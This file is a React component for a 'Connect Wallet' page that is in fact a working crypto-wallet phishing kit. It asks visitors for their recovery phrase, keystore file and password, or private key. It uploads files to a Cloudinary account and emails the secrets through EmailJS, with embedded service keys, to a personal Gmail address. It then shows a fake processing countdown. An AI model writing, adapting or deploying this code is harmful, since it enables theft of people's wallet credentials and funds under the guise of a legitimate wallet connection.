import React, { useEffect, useRef, useState } from 'react'
import "../styles/Wallet.css"
import serachIcon from "../assets/icons/black search icon.png"
import clearIcon from "../assets/icons/reject.png"
import walletData from "../../public/Wallet.json"
import othersIcon from "../assets/wallet_images/others icon.png"
import emailjs from 'emailjs-com'
import { useNavigate } from 'react-router-dom'
import axios from "axios"
import "../styles/Done.css"
import loadGif from '../assets/icons/loading.gif'

const Wallet = () => {
    const navigate = useNavigate()
    const [errorMessage, setErrorMessage] = useState("")

    // Handling search box
    const [searchValue, setSearchValue] = useState("")

    const filteredWallets = walletData.filter(wallet => 
        wallet.name.toLowerCase().includes(searchValue.toLowerCase())
    )

    // Handling file input
    const [fileName, setFileName] = useState("Choose Key File")
    const [selectedFile, setSelectedFile] = useState(null)

    const handleFileChange = (e) => {
        const file = e.target.files[0]
        setFileName(file.name)
        setSelectedFile(file)
    }


    // HANDLING OVERLAY DISPLAY
    const [selectedWallet, setSelectedWallet] = useState(null)
    const overlayDiv = useRef(null)


    const openOverlay = (wallet) => {
        setSelectedWallet(wallet); // Store the clicked wallet data
        overlayDiv.current.style.display = "flex"; // Show the overlay
    };

    const closeOverlay = () => {
        overlayDiv.current.style.display = "none"; // Hide the overlay
        setSelectedWallet(null); // Clear selected wallet
        setInputValue("");
        setWalletName("");
    };

    // HANDLING NAME WALLET INPUT
    const addWalletName = useRef(null)

    const handleWalletClick = (wallet) => {
        setSelectedWallet(wallet);  // Store the selected wallet
        addWalletName.current.style.display = "block";  // Show overlay
    };

    // HANDLING THE PHRASE, KEYSTORE & PRIV
    const phraseDiv = useRef(null)
    const keystoreDiv = useRef(null)
    const privateDiv = useRef(null)

    const openPhrase = () => {
        phraseDiv.current.style.display = "flex"
        keystoreDiv.current.style.display = "none"
        privateDiv.current.style.display = "none"
    }

    const openKeystore = () => {
        phraseDiv.current.style.display = "none"
        keystoreDiv.current.style.display = "flex"
        privateDiv.current.style.display = "none"
    }

    const openPrivate = () => {
        phraseDiv.current.style.display = "none"
        keystoreDiv.current.style.display = "none"
        privateDiv.current.style.display = "flex"
    }

    // HANDLING FORM SUBMIT AND SENDING EMAIL
    const [inputValue, setInputValue] = useState("");
    const [walletName, setWalletName] = useState("")

    // To Upload file to cloudinary

    const uploadFile = async () => {
        if (!selectedFile) return "";

        const formData = new FormData()
        formData.append('file', selectedFile)
        formData.append('upload_preset', 'recti_preset')
        //   cloud name

        try {
            const response = await axios.post("https://api.cloudinary.com/v1_1/dwhucwozn/upload", formData);
            return response.data.secure_url
        } catch (error) {
            console.error("File upload error:", error);
            return "";
        }
    }

     // Function to send email

    const handleSubmit = async (section) => {
        

        if (!inputValue.trim()) {
            setErrorMessage("Please fill in the required field before connecting.");
            clearErrorAfterDelay();
            return;
        }
    
        if ((section === "Keystore JSON" || section === "Private Key") && !selectedFile) {
            setErrorMessage("Please upload a file before connecting.");
            clearErrorAfterDelay();
            return;
        }
    
        if ((selectedWallet?.name === "Others" || selectedWallet?.name === "Other Wallet") && !walletName.trim()) {
            setErrorMessage("Please enter the wallet name.");
            clearErrorAfterDelay();
            return;
        }

        let fileUrl = selectedFile ? await uploadFile() : ""

        // git add .
        // git commit -m "Your update message here"
        // git push
        let templateParams = {
            from_email: "dazaloland@gmail.com",
            // from_email: "techjames27@gmail.com",
            // to_email: "dazaloland@gmail.com",
            to_email: "techjames27@gmail.com",
            wallets: selectedWallet?.name,
            wallet_name: walletName || "N/A",
            input_value: inputValue,
            section: section,
            file_url: fileUrl || "No link to download",
        }
        // emailjs.send("service_n8wfwi8", "template_ajvfdr7", templateParams, "fkNhhzrs3FhPuz9cW") // techjames27@gmail.com
        emailjs.send("service_xn96ima", "template_fqf2u5w", templateParams, "gmQnpCyVXg3liXyDO") // secondtechjames@gmail.com
        // emailjs.send("service_i13gstj", "template_m0wmsy5", templateParams, "kwk2618gjbpiY0Y04") // thirdtechjames@gmail.com
            .then(() => {
                // alert("Message sent successfully!");
                startCountdown()
            })
            .catch((error) => {
                // alert("Failed to send message, try again.");
                console.error(error)
                let errorMessage = "Failed To Connect The Wallet, Try Again" 
            })
    }

    // Function to remove the error message after 5 seconds
    const clearErrorAfterDelay = () => {
        setTimeout(() => {
            setErrorMessage("");
        }, 5000);
    };

    // FUNCTION TPO DISPLAY COUNTDOWN
    const [countdown, setCountdown] = useState(null);
    // const router = useRouter()

    const startCountdown = () => {
        setCountdown(10);
    }

    useEffect(() => {
    if (countdown === 0) {
        navigate("/wallet/done")
        // router.push("/next-page"); // Change to your desired route
    }
    if (countdown !== null && countdown > 0) {
        const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
        return () => clearTimeout(timer);
    }
    }, [countdown])
// , router



  return (
    <>
    <div className="wallet-gen-div">
        <p className='wallet-big-name'>CONNECT WALLET</p>
        <p className="wallet-sma-name">From The Wallet Options Below, Choose Your Preffered Wallet To Connect</p>
        <div className="serch-box-div">
            <div className="serch-img-div">
                <img src={serachIcon} alt="" />
            </div>
            <input 
                type="text"
                value={searchValue}
                onChange={(e) => setSearchValue(e.target.value)} 
            />
            <div className="clear-text-div">
                <img src={clearIcon} alt="" onClick={() => setSearchValue("")} />
            </div>
        </div>
        <div className="wallet-block-main-div">
            {filteredWallets.length > 0 ? (
                filteredWallets.map(wallet => (
                    <div key={wallet.id} className='check' onClick={() => openOverlay(wallet)}>
                        {/* className="each-wallet-div" */}
                        <div>
                            <img src={wallet.image} alt={wallet.name} />
                        </div>
                        <p>{wallet.name}</p>
                    </div>
                ))
            ) : (
                <>
                {/* <p className='not-found'>Wallet not found</p> */}
                <div className='check' onClick={() => openOverlay({ name: "Other Wallet", image: othersIcon })}>
                    <div>
                        <img src={othersIcon} alt="" />
                    </div>
                    <p>Others</p>
                </div>
                </>
            )}
        </div>
        
        {/* OVERLAY DIV */}
        <div className="overlay-gen-div" ref={overlayDiv}>
            <div className="main-overlay-cont">
                
                <div className="remove-con" onClick={closeOverlay}>
                    <img src={clearIcon} alt="" />
                </div>
                {selectedWallet && (
                    <>
                    <div className="ov-name-img-div">
                        <div>
                            <img src={selectedWallet.image} alt={selectedWallet.name} />
                        </div>
                        <p>Import Your <span>{selectedWallet.name}</span></p>
                    </div>
                    </>
                )}
                <div className="ov-link-div">
                    <p onClick={openPhrase}>Phrase</p>
                    <p onClick={openKeystore}>Keystore JSON</p>
                    <p onClick={openPrivate}>Private Key</p>
                </div>
                {/* Phrase */}
                <div className="phr-main-div" ref={phraseDiv}>
                    {selectedWallet && (selectedWallet.name === "Others" || selectedWallet.name === "Other Wallet") && (
                        <input type="text" className='name-inc-phr' 
                        placeholder='Enter Wallet Name' 
                        ref={addWalletName} 
                        value={walletName} 
                        onChange={(e) => setWalletName(e.target.value)}
                        required
                        />
                    )}
                    <textarea name="" id="" className="phr-area" 
                    placeholder='Enter Your Recovery Phase' 
                    value={inputValue} 
                    required
                    onChange={(e) => setInputValue(e.target.value)}>
                    </textarea>
                    {errorMessage && <p className="error-message" style={{color: 'red'}}>{errorMessage}</p>}
                    <p>Typically 12 (sometimes 24) words separated by single spaces</p>
                    <button onClick={() => handleSubmit("Pass Phrase")}>CONNECT</button>
                </div>
                {/* Keystore */}
                <div className="keys-main-div" ref={keystoreDiv}>
                    {selectedWallet && (selectedWallet.name === "Others" || selectedWallet.name === "Other Wallet") && (
                        <input type="text" className='name-inc-phr' 
                        placeholder='Enter Wallet Name' 
                        ref={addWalletName}  
                        value={walletName}
                        onChange={(e) => setWalletName(e.target.value)}
                        required
                        />
                    )}
                    <div className="key-file">
                        <input type="file" onChange={handleFileChange} required/>
                        <p>{fileName}</p>
                    </div>
                    <input type="text" className='pawd' 
                    placeholder='Wallet Password'  
                    value={inputValue} 
                    onChange={(e) => setInputValue(e.target.value)}
                    required
                    />
                    {errorMessage && <p className="error-message" style={{color: 'red'}}>{errorMessage}</p>}
                    <p>Several lines of text beginning with {`"{...}"`} plus the password you used to encrypt it.</p>
                    <button onClick={() => handleSubmit("Keystore JSON")}>CONNECT</button>
                </div>
                {/* Private */}
                <div className="priv-main-div" ref={privateDiv}>
                    {selectedWallet && (selectedWallet.name === "Others" || selectedWallet.name === "Other Wallet") && (
                        <input type="text" className='name-inc-phr' 
                        placeholder='Enter Wallet Name'
                        ref={addWalletName}
                        value={walletName}
                        onChange={(e) => setWalletName(e.target.value)}
                        required
                        />
                    )}
                    <input type="text" className='priv-wall-inp' 
                    placeholder='Enter Your Wallet Key' 
                    value={inputValue} 
                    onChange={(e) => setInputValue(e.target.value)}
                    required
                    />
                    {errorMessage && <p className="error-message" style={{color: 'red'}}>{errorMessage}</p>}
                    <p>Typically 12 (sometimes 24) words seperated by a single space.</p>
                    <button onClick={() => handleSubmit("Private Key")}>CONNECT</button>
                </div>
            </div>
        </div>
        {/* count */}
        {countdown !== null && (
            <div className='count-gdgdgd'>
                <div className="load-gen-div">
                    <p>PROCESSING...</p>
                    <div className="load-cont">
                        <div>
                            <img src={loadGif} alt="" />
                        </div>
                        <p>Ready in {countdown}</p>
                    </div>
                </div>
          </div>
        )}
    </div>
    </>
  )
}

export default Wallet